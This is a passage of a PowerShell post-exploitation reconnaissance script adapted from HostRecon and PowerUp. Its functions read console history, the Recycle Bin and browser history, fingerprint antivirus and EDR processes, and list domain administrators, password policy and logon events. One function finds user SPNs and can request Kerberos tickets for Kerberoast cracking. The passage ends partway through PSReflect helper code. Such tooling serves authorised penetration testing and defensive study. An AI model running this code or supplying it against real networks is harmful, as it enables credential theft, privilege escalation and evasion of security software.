        "`n[+] Current User Powershell Console History:`n`n"
        Try {
            $PowershellHistory = (Get-PSReadlineOption).HistorySavePath
            (Get-Content $PowershellHistory -EA 0 |select -last 50) -join "`r`n"
        } Catch [System.Management.Automation.CommandNotFoundException]{
            (Get-Content $ENV:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -EA 0 |select -last 50) -join "`r`n"
        }
        
    }
    
    function Get-RecycleBin {
    <#
      .SYNOPSIS
    
      Gets the contents of the Recycle Bin for the current user
    
    #>  
        Write-Verbose "Enumerating deleted files in Recycle Bin..."
        Try {
            $Shell = New-Object -ComObject Shell.Application
            $Recycler = $Shell.NameSpace(0xa)
            If (($Recycler.Items().Count) -gt 0) {
                $Output += $Recycler.Items() | Sort ModifyDate -Descending | Select-Object Name, Path, ModifyDate, Size, Type
            }
            Else {
                Write-Verbose "No deleted items found in Recycle Bin!`n"
            }
        }
        Catch {Write-Verbose "[-] Error getting deleted items from Recycle Bin! $($Error[0])`n"}
        
        Return $Output
    }
    
    function Get-AVInfo {
    <#
      .SYNOPSIS
    
        Gets the installed AV product and current status
    
    #>
        Write-Verbose "Enumerating installed AV product..."
    
        $AntiVirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct  -ComputerName $env:computername
    
        switch ($AntiVirusProduct.productState) { 
            "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
            "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
            "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
            "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
            "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
            "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
            "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
            "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
            "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
            "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
            "397568" {$defstatus = "Up to date"; $rtstatus = "Enabled"}
            "393472" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
        default {$defstatus = "Unknown" ;$rtstatus = "Unknown"} 
        }
        
        # Create hash-table
        $ht = @{}
        $ht.Computername = $env:computername
        $ht.Name = $AntiVirusProduct.displayName
        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid
        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe
        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe
        $ht.'Definition Status' = $defstatus
        $ht.'Real-time Protection Status' = $rtstatus
    
        # Convert to PS object and then format as a string for file output
        $Output = New-Object -TypeName PSObject -Property $ht #|Format-List
        
        Return $Output
    }
    
    function Get-McafeeLogs {
    <#
      .SYNOPSIS
    
        Searches Application log for "McLogEvent" Provider associated with McAfee AV products and selects the first 50 events from the last 14 days
    
    #>
        Write-Verbose "Enumerating Mcafee AV events..."
        # Get events from the last two weeks
        $date = (get-date).AddDays(-14)
        $ProviderName = "McLogEvent"
        # Try to get McAfee AV event logs
        Try {
            $McafeeLogs = Get-WinEvent -FilterHashTable @{ logname = "Application"; StartTime = $date; ProviderName = $ProviderName; }
            $McafeeLogs |Select-Object -First 50 ID, Providername, DisplayName, TimeCreated, Level, UserID, ProcessID, Message
        }
        Catch {
            Write-Verbose "[-] Error getting McAfee AV event logs! $($Error[0])`n"
        }
    }
        
    function Get-AVProcesses {
    <#
      .SYNOPSIS
        
        Returns suspected AV processes based on name matching
        
        AV process list adapted from Beau Bullock's HostRecon AV detection code
        https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1
    
    #>
        Write-Verbose "Enumerating potential AV processes..."
        $processes = Get-Process
        
        $avlookuptable = @{
                    #explorer                   = "Explorer (testing)"
                    mcshield                    = "McAfee AV"
                    FrameworkService            = "McAfee AV"
                    naPrdMgr                    = "McAfee AV"
                    windefend                   = "Windows Defender AV"
                    MSASCui                     = "Windows Defender AV"
                    msmpeng                     = "Windows Defender AV"
                    msmpsvc                     = "Windows Defender AV"
                    WRSA                        = "WebRoot AV"
                    savservice                  = "Sophos AV"
                    TMCCSF                      = "Trend Micro AV"
                    "symantec antivirus"        = "Symantec AV"
                    ccSvcHst                    = "Symantec Endpoint Protection"
                    TaniumClient                = "Tanium"
                    mbae                        = "MalwareBytes Anti-Exploit"
                    parity                      = "Bit9 application whitelisting"
                    cb                          = "Carbon Black behavioral analysis"
                    "bds-vision"                = "BDS Vision behavioral analysis"
                    Triumfant                   = "Triumfant behavioral analysis"
                    CSFalcon                    = "CrowdStrike Falcon EDR"
                    ossec                       = "OSSEC intrusion detection"
                    TmPfw                       = "Trend Micro firewall"
                    dgagent                     = "Verdasys Digital Guardian DLP"
                    kvoop                       = "Forcepoint and others"
                    xagt                        = "FireEye Endpoint Agent"
                }
                
        ForEach ($process in $processes) {
                ForEach ($key in $avlookuptable.keys){
                
                    if ($process.ProcessName -match $key){
                        New-Object -TypeName PSObject -Property @{
                            AVProduct   = ($avlookuptable).Get_Item($key)
                            ProcessName = $process.ProcessName
                            PID         = $process.ID
                            }
                    }
                }
        }
    }
        
    function Get-DomainAdmins {
    <#
      .SYNOPSIS
    
      Enumerates admininistrator type accounts within the domain using code adapted from Dafthack HostRecon.ps1
    
    #>  
        Write-Verbose "Enumerating Domain Administrators..."
        $Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()
                
        Try {
            $DAgroup = ([adsi]"WinNT://$domain/Domain Admins,group")
            $Members = @($DAgroup.psbase.invoke("Members"))
            [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
            "`n[+] Domain Admins:`n"
            $MemberNames
    
            $EAgroup = ([adsi]"WinNT://$domain/Enterprise Admins,group")
            $Members = @($EAgroup.psbase.invoke("Members"))
            [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
            "`n[+] Enterprise Admins:`n"
            $MemberNames
            
            $SAgroup = ([adsi]"WinNT://$domain/Schema Admins,group")
            $Members = @($DAgroup.psbase.invoke("Members"))
            [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
            "`n[+] Schema Admins:`n"
            $MemberNames
    
            $DAgroup = ([adsi]"WinNT://$domain/Administrators,group")
            $Members = @($DAgroup.psbase.invoke("Members"))
            [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
            "`n[+] Administrators:`n"
            $MemberNames
        }
        Catch {
            Write-Verbose "[-] Error connecting to the domain while retrieving group members."    
        }
    }
    
    function Get-DomainAccountPolicy {
    <#
      .SYNOPSIS
    
      Enumerates account policy from the domain with code adapted from Dafthack HostRecon.ps1
    
    #>  
    
    Write-Verbose "Enumerating domain account policy"
    $Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()
    
        Try {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = [ADSI]"WinNT://$env:USERDOMAIN"
            $Name = @{Name="DomainName";Expression={$_.Name}}
            $MinPassLen = @{Name="Minimum Password Length";Expression={$_.MinPasswordLength}}
            $MinPassAge = @{Name="Minimum Password Age (Days)";Expression={$_.MinPasswordAge.value/86400}}
            $MaxPassAge = @{Name="Maximum Password Age (Days)";Expression={$_.MaxPasswordAge.value/86400}}
            $PassHistory = @{Name="Enforce Password History (Passwords remembered)";Expression={$_.PasswordHistoryLength}}
            $AcctLockoutThreshold = @{Name="Account Lockout Threshold";Expression={$_.MaxBadPasswordsAllowed}}
            $AcctLockoutDuration =  @{Name="Account Lockout Duration (Minutes)";Expression={if ($_.AutoUnlockInterval.value -eq -1) {'Account is locked out until administrator unlocks it.'} else {$_.AutoUnlockInterval.value/60}}}
            $ResetAcctLockoutCounter = @{Name="Observation Window";Expression={$_.LockoutObservationInterval.value/60}}
            
            $CurrentDomain | Select-Object $Name,$MinPassLen,$MinPassAge,$MaxPassAge,$PassHistory,$AcctLockoutThreshold,$AcctLockoutDuration,$ResetAcctLockoutCounter
        }
        Catch {
                Write-Verbose "[-] Error connecting to the domain while retrieving password policy."    
        }
    }
    
    function Get-BrowserInformation {
    <#
        .SYNOPSIS
    
            Dumps Browser Information
            Author: @424f424f
            License: BSD 3-Clause
            Required Dependencies: None
            Optional Dependencies: None
            https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
    
        .DESCRIPTION
    
            Enumerates browser history or bookmarks for a Chrome, Internet Explorer,
            and/or Firefox browsers on Windows machines.
    
        .PARAMETER Browser
    
            The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'
    
        .PARAMETER Datatype
    
            Type of data to enumerate, 'History' or 'Bookmarks'
    
        .PARAMETER UserName
    
            Specific username to search browser information for.
    
        .PARAMETER Search
    
            Term to search for
    
        .EXAMPLE
    
            PS C:\> Get-BrowserInformation
    
            Enumerates browser information for all supported browsers for all current users.
    
        .EXAMPLE
    
            PS C:\> Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user1
    
            Enumerates bookmarks for Internet Explorer for the user 'user1'.
    
        .EXAMPLE
    
            PS C:\> Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'
    
            Enumerates bookmarks for Internet Explorer for the user 'user1' and only returns
            results matching the search term 'github'.
    #>
        [CmdletBinding()]
        Param
        (
            [Parameter(Position = 0)]
            [String[]]
            [ValidateSet('Chrome','IE','FireFox', 'All')]
            $Browser = 'All',
    
            [Parameter(Position = 1)]
            [String[]]
            [ValidateSet('History','Bookmarks','All')]
            $DataType = 'All',
    
            [Parameter(Position = 2)]
            [String]
            $UserName = '',
    
            [Parameter(Position = 3)]
            [String]
            $Search = ''
        )
    
        Write-Verbose "Enumerating web browser history..."
    
        function ConvertFrom-Json20{
            #http://stackoverflow.com/a/29689642
            
          param
          (
            $item
          )
    Add-Type -AssemblyName System.Web.Extensions
            $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
            return ,$ps_js.DeserializeObject($item)
            
        }
    
        function Get-ChromeHistory {
            $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
            if (-not (Test-Path -Path $Path)) {
                Write-Verbose "[-] Could not find Chrome History for username: $UserName"
            }
            $Regex = '(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
            $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {$_.Matches}
            $Value | ForEach-Object {
                $Key = $_
                if ($Key -match $Search){
                    New-Object -TypeName PSObject -Property @{
                        User = $UserName
                        Browser = 'Chrome'
                        DataType = 'History'
                        Data = $_.Value
                    }
                }
            }        
        }
    
        function Get-ChromeBookmarks {
        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
        if (-not (Test-Path -Path $Path)) {
            Write-Verbose "[-] Could not find Chrome Bookmarks for username: $UserName"
        }   else {
                $Json = Get-Content $Path
                $Output = ConvertFrom-Json20($Json)
                $Jsonobject = $Output.roots.bookmark_bar.children
                # Modified parsing to properly iterate of the array of dictionaries
                $JsonObject | ForEach-Object {
                    New-Object -TypeName PSObject -Property @{
                        User = $UserName
                        Browser = 'Chrome'
                        DataType = 'Bookmark'
                        Data = $_.item('url')
                        Name = $_.item('name')
                    }
                }
            }
        }
    
        function Get-InternetExplorerHistory {
            #https://crucialsecurityblog.harris.com/2011/03/14/typedurls-part-1/
    
            $Null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -ErrorAction SilentlyContinue
            $Paths = Get-ChildItem 'HKU:\' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
    
            ForEach($Path in $Paths) {
    
                $User = ([System.Security.Principal.SecurityIdentifier] $Path.PSChildName).Translate( [System.Security.Principal.NTAccount]) | Select -ExpandProperty Value
    
                $Path = $Path | Select-Object -ExpandProperty PSPath
    
                $UserPath = "$Path\Software\Microsoft\Internet Explorer\TypedURLs"
                if (-not (Test-Path -Path $UserPath)) {
                    Write-Verbose "[-] Could not find IE History for SID: $Path"
                }
                else {
                    Get-Item -Path $UserPath -ErrorAction SilentlyContinue | ForEach-Object {
                        $Key = $_
                        $Key.GetValueNames() | ForEach-Object {
                            $Value = $Key.GetValue($_)
                            if ($Value -match $Search) {
                                New-Object -TypeName PSObject -Property @{
                                    User = $UserName
                                    Browser = 'IE'
                                    DataType = 'History'
                                    Data = $Value
                                }
                            }
                        }
                    }
                }
            }
        }
    
        function Get-InternetExplorerBookmarks {
            $URLs = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
            ForEach ($URL in $URLs) {
                if ($URL.FullName -match 'Favorites') {
                    $User = $URL.FullName.split('\')[2]
                    Get-Content -Path $URL.FullName | ForEach-Object {
                        try {
                            if ($_.StartsWith('URL')) {
                                # parse the .url body to extract the actual bookmark location
                                $URL = $_.Substring($_.IndexOf('=') + 1)
    
                                if($URL -match $Search) {
                                    New-Object -TypeName PSObject -Property @{
                                        User = $User
                                        Browser = 'IE'
                                        DataType = 'Bookmark'
                                        Data = $URL
                                    }
                                }
                            }
                        }
                        catch {
                            Write-Verbose "Error parsing url: $_"
                        }
                    }
                }
            }
        }
    
        function Get-FirefoxHistory {
            $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
            if (-not (Test-Path -Path $Path)) {
                Write-Verbose "[-] Could not find FireFox History for username: $UserName"
            }
            else {
                $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
                # Modified Regex to match SQLite DB
                $Regex = '(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
                $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches | Select-Object -ExpandProperty Matches |Sort -Unique
                $Value | ForEach-Object {
                        New-Object -TypeName PSObject -Property @{
                            User = $UserName
                            Browser = 'Firefox'
                            DataType = 'History'
                            Data = $_.Value
                            }    
                        }
            }
        }
    
        if (!$UserName) {
            $UserName = "$ENV:USERNAME"
        }
    
        if(($Browser -Contains 'All') -or ($Browser -Contains 'Chrome')) {
            if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
                Get-ChromeHistory
            }
            if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
                Get-ChromeBookmarks
            }
        }
    
        if(($Browser -Contains 'All') -or ($Browser -Contains 'IE')) {
            if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
                Get-InternetExplorerHistory
            }
            if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
                Get-InternetExplorerBookmarks
            }
        }
    
        if(($Browser -Contains 'All') -or ($Browser -Contains 'FireFox')) {
            if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
                Get-FireFoxHistory
            }
        }
    }
    
    function Get-ActiveIEURLS {
    <#
      .SYNOPSIS
    
      Returns a list of URLs currently loaded in the browser
      Source: http://windowsitpro.com/powershell/retrieve-information-open-browsing-sessions
    #>
        Param([switch]$Full, [switch]$Location, [switch]$Content)
        Write-Verbose "Enumerating active Internet Explorer windows"
        $urls = (New-Object -ComObject Shell.Application).Windows() |
        Where-Object {$_.LocationUrl -match "(^https?://.+)|(^ftp://)"} |
        Where-Object {$_.LocationUrl}
        if ($urls) {
            if($Full)
            {
                $urls
            }
            elseif($Location)
            {
                $urls | Select Location*
            }
            elseif($Content)
            {
                $urls | ForEach-Object {
                    $_.LocationName;
                    $_.LocationUrl;
                    $_.Document.body.innerText
                }
            }
            else
            {
                $urls | Select-Object LocationUrl, LocationName
            }
        }
        else {
            Write-Verbose "[-] No active Internet Explorer windows found"
        }
    }
    
    # End Browser Enumeration
    
    function Get-ExplicitLogonEvents {
    <#
        .SYNOPSIS
    
        Gets 4648 Explicit Logon Events from Windows Event Log
    
        Author: Lee Christensen (@tifkin_)
    #>
    
        [CmdletBinding()]
        Param(
            [int]
            $Days = 10
        )
    
        Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4648; StartTime=(Get-Date).AddDays(-$Days)} | ?{!$_.Properties[5].Value.EndsWith('$')} | %{
    
            $Properties = $_.Properties
            New-Object PSObject -Property @{
                TimeCreated       = $_.TimeCreated
                #SubjectUserSid    = $Properties[0].Value.ToString()
                SubjectUserName   = $Properties[1].Value
                SubjectDomainName = $Properties[2].Value
                #SubjectLogonId    = $Properties[3].Value
                #LogonGuid         = $Properties[4].Value.ToString()
                TargetUserName    = $Properties[5].Value
                TargetDomainName  = $Properties[6].Value
                #TargetLogonGuid   = $Properties[7].Value
                #TargetServerName  = $Properties[8].Value
                #TargetInfo        = $Properties[9].Value
                #ProcessId         = $Properties[10].Value
                ProcessName       = $Properties[11].Value
                IpAddress         = $Properties[12].Value
                #IpPort            = $Properties[13].Value
            }
        }
    }
    
    function Get-LogonEvents {
    <#
        .SYNOPSIS
    
        Gets 4624 Logon Events from Windows Event Log
    
        Author: Lee Christensen (@tifkin_)
    #>
        [CmdletBinding()]
        Param(
            [int]
            $MaxEvents = 10
        )
    
        Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents $MaxEvents | %{
            $Properties = $_.Properties
            New-Object PSObject -Property @{
                TimeCreated               = $_.TimeCreated
                #SubjectUserSid            = $Properties[0].Value.ToString()
                #SubjectUserName           = $Properties[1].Value
                #SubjectDomainName         = $Properties[2].Value
                #SubjectLogonId            = $Properties[3].Value
                #Subject = "$($Properties[2].Value)\$($Properties[1].Value)"
                #TargetUserSid             = $Properties[4].Value.ToString()
                #TargetUserName            = $Properties[5].Value
                #TargetDomainName          = $Properties[6].Value
                #TargetLogonId             = $Properties[7].Value
                Target = "$($Properties[6].Value)\$($Properties[5].Value)"
                LogonType                 = $Properties[8].Value
                #LogonProcessName          = $Properties[9].Value
                AuthenticationPackageName = $Properties[10].Value
                #WorkstationName           = $Properties[11].Value
                #LogonGuid                 = $Properties[12].Value
                #TransmittedServices       = $Properties[13].Value
                #LmPackageName             = $Properties[14].Value
                #KeyLength                 = $Properties[15].Value
                #ProcessId                 = $Properties[16].Value
                #ProcessName               = $Properties[17].Value
                IpAddress                 = $Properties[18].Value
                #ImpersonationLevel        = $Properties[20].Value
                #RestrictedAdminMode       = $Properties[21].Value
                #TargetOutboundUserName    = $Properties[22].Value
                #TargetOutboundDomainName  = $Properties[23].Value
                #VirtualAccount            = $Properties[24].Value
                #TargetLinkedLogonId       = $Properties[25].Value
                #ElevatedToken             = $Properties[26].Value
            }
        }
    }
    
    
    function Get-UserSPNS {
    <#
      .SYNOPSIS
    
      # Edits by Tim Medin
      # File:     GetUserSPNS.ps1
      # Contents: Query the domain to find SPNs that use User accounts
      # Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast
      #           The password hash used with Computer accounts are infeasible to 
      #           crack; however, if the User account associated with an SPN may have
      #           a crackable password. This tool will find those accounts. You do not
      #           need any special local or domain permissions to run this script. 
      #           This script on a script supplied by Microsoft (details below).
      # History:  2016/07/07     Tim Medin    Add -UniqueAccounts parameter to only get unique SAMAccountNames
    #>
      [CmdletBinding()]
      Param(
        [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
        [Parameter(Mandatory=$False)] [string]$Filter,
        [Parameter(Mandatory=$False)] [switch]$Request,
        [Parameter(Mandatory=$False)] [switch]$UniqueAccounts
      )
      Write-Verbose "Enumerating user SPNs for potential Kerberoast cracking..."
      Add-Type -AssemblyName System.IdentityModel
    
      $GCs = @()
    
      If ($GCName) {
        $GCs += $GCName
      } else { # find them
        $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
        ForEach ($GC in $CurrentGCs) {
          #$GCs += $GC.Name
          $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
        }
      }
    
      if (-not $GCs) {
        # no Global Catalogs Found
        Write-Output "`n[-] No Global Catalogs Found!"
        Return
      }
    
      ForEach ($GC in $GCs) {
          $searcher = New-Object System.DirectoryServices.DirectorySearcher
          $searcher.SearchRoot = "LDAP://" + $GC
          $searcher.PageSize = 1000
          $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
          $Null = $searcher.PropertiesToLoad.Add("serviceprincipalname")
          $Null = $searcher.PropertiesToLoad.Add("name")
          $Null = $searcher.PropertiesToLoad.Add("samaccountname")
          #$Null = $searcher.PropertiesToLoad.Add("userprincipalname")
          #$Null = $searcher.PropertiesToLoad.Add("displayname")
          $Null = $searcher.PropertiesToLoad.Add("memberof")
          $Null = $searcher.PropertiesToLoad.Add("pwdlastset")
          #$Null = $searcher.PropertiesToLoad.Add("distinguishedname")
    
          $searcher.SearchScope = "Subtree"
    
          $results = $searcher.FindAll()
          
          [System.Collections.ArrayList]$accounts = @()
              
          foreach ($result in $results) {
              foreach ($spn in $result.Properties["serviceprincipalname"]) {
                  $o = Select-Object -InputObject $result -Property `
                      @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
                      @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
                      #@{Name="UserPrincipalName";   Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
                      @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
                      #@{Name="DisplayName";         Expression={$result.Properties["displayname"][0].ToString()} }, `
                      @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
                      @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } #, `
                      #@{Name="DistinguishedName";   Expression={$result.Properties["distinguishedname"][0].ToString()} }
                  if ($UniqueAccounts) {
                      if (-not $accounts.Contains($result.Properties["samaccountname"][0].ToString())) {
                          $Null = $accounts.Add($result.Properties["samaccountname"][0].ToString())
                          $o
                          if ($Request) {
                              $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
                          }
                      }
                  } else {
                      $o
                      if ($Request) {
                          $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
                      }
                  }
              }
          }
      }
    }
    
    ###########
    # PowerUp
    ###########

    
    <#
        Modified version of PowerUp (authored by @harmj0y) without the modification functions
        
        PowerUp aims to be a clearinghouse of common Windows privilege escalation
        vectors that rely on misconfigurations. See README.md for more information.
    
        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        
        Link: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
    #>
    
    #Requires -Version 2
    
    
    ########################################################
    #
    # PSReflect code for Windows API access
    # Author: @mattifestation
    #   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
    #
    ########################################################
    
    function New-InMemoryModule
    {
    <#
      .SYNOPSIS
    
      Creates an in-memory assembly and module
    
      Author: Matthew Graeber (@mattifestation)
      License: BSD 3-Clause
      Required Dependencies: None
      Optional Dependencies: None
    
      .DESCRIPTION
    
      When defining custom enums, structs, and unmanaged functions, it is
      necessary to associate to an assembly module. This helper function
      creates an in-memory module that can be passed to the 'enum',
      'struct', and Add-Win32Type functions.
    
      .PARAMETER ModuleName
    
      Specifies the desired name for the in-memory assembly and module. If
      ModuleName is not provided, it will default to a GUID.
    
      .EXAMPLE
    
      $Module = New-InMemoryModule -ModuleName Win32
    #>
    
        Param
        (
            [Parameter(Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ModuleName = [Guid]::NewGuid().ToString()
        )
    
        $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
        $LoadedAssemblies = $AppDomain.GetAssemblies()
    
        foreach ($Assembly in $LoadedAssemblies) {
            if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
                return $Assembly
            }
        }
    
        $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
        $Domain = $AppDomain
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    
        return $ModuleBuilder
    }
    
    
    # A helper function used to reduce typing while defining function
    # prototypes for Add-Win32Type.
    function script:func
    {
        Param
        (
            [Parameter(Position = 0, Mandatory=$True)]
            [String]
            $DllName,
    
            [Parameter(Position = 1, Mandatory=$True)]
            [string]
            $FunctionName,
    
            [Parameter(Position = 2, Mandatory=$True)]
            [Type]
            $ReturnType,
    
            [Parameter(Position = 3)]
            [Type[]]
            $ParameterTypes,
    
            [Parameter(Position = 4)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention,
    
            [Parameter(Position = 5)]
            [Runtime.InteropServices.CharSet]
            $Charset,
    
            [String]
            $EntryPoint,
    
            [Switch]
            $SetLastError
        )
    
        $Properties = @{
            DllName = $DllName
            FunctionName = $FunctionName
            ReturnType = $ReturnType
        }
    
        if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
        if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
        if ($Charset) { $Properties['Charset'] = $Charset }
        if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
        if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
    
        New-Object PSObject -Property $Properties
    }
    
    
    function Add-Win32Type
    {
    <#
      .SYNOPSIS
    
      Creates a .NET type for an unmanaged Win32 function.
    
      Author: Matthew Graeber (@mattifestation)
      License: BSD 3-Clause
      Required Dependencies: None
      Optional Dependencies: func
    
      .DESCRIPTION
    
      Add-Win32Type enables you to easily interact with unmanaged (i.e.
      Win32 unmanaged) functions in PowerShell. After providing
      Add-Win32Type with a function signature, a .NET type is created
      using reflection (i.e. csc.exe is never called like with Add-Type).
    
      The 'func' helper function can be used to reduce typing when defining
      multiple function definitions.
    
      .PARAMETER DllName
    
      The name of the DLL.
    
      .PARAMETER FunctionName
    
      The name of the target function.
    
      .PARAMETER EntryPoint
    
      The DLL export function name. This argument should be specified if the
      specified function name is different than the name of the exported
      function.
    
      .PARAMETER ReturnType
    
      The return type of the function.
    
      .PARAMETER ParameterTypes
    
      The function parameters.
    
      .PARAMETER NativeCallingConvention
    
      Specifies the native calling convention of the function. Defaults to
      stdcall.
    
      .PARAMETER Charset
    
      If you need to explicitly call an 'A' or 'W' Win32 function, you can
      specify the character set.
    
      .PARAMETER SetLastError
    
      Indicates whether the callee calls the SetLastError Win32 API
      function before returning from the attributed method.
    
      .PARAMETER Module
    
      The in-memory module that will host the functions. Use
      New-InMemoryModule to define an in-memory module.
    
      .PARAMETER Namespace
    
      An optional namespace to prepend to the type. Add-Win32Type defaults
      to a namespace consisting only of the name of the DLL.
    
      .EXAMPLE
    
      $Mod = New-InMemoryModule -ModuleName Win32
    
      $FunctionDefinitions = @(
      (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
      (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
      (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
      )
    
      $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
      $Kernel32 = $Types['kernel32']
      $Ntdll = $Types['ntdll']
      $Ntdll::RtlGetCurrentPeb()
      $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
      $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
    
      .NOTES
    
      Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
    
      When defining multiple function prototypes, it is ideal to provide
      Add-Win32Type with an array of function signatures. That way, they
      are all incorporated into the same in-memory module.
    #>
    
        [OutputType([Hashtable])]
        Param(
            [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
            [String]
            $DllName,
    
            [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
            [String]
            $FunctionName,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [String]
            $EntryPoint,
    
            [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
            [Type]
            $ReturnType,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Type[]]
            $ParameterTypes,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Runtime.InteropServices.CharSet]
            $Charset = [Runtime.InteropServices.CharSet]::Auto,
    
            [Parameter(ValueFromPipelineByPropertyName=$True)]
            [Switch]
            $SetLastError,
    
            [Parameter(Mandatory=$True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
    
            [ValidateNotNull()]
            [String]
            $Namespace = ''
        )
    
        BEGIN
        {
            $TypeHash = @{}
        }
    
        PROCESS
        {
            if ($Module -is [Reflection.Assembly])
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
                }
                else
                {
                    $TypeHash[$DllName] = $Module.GetType($DllName)
                }
            }
            else
            {
                # Define one type for each DLL
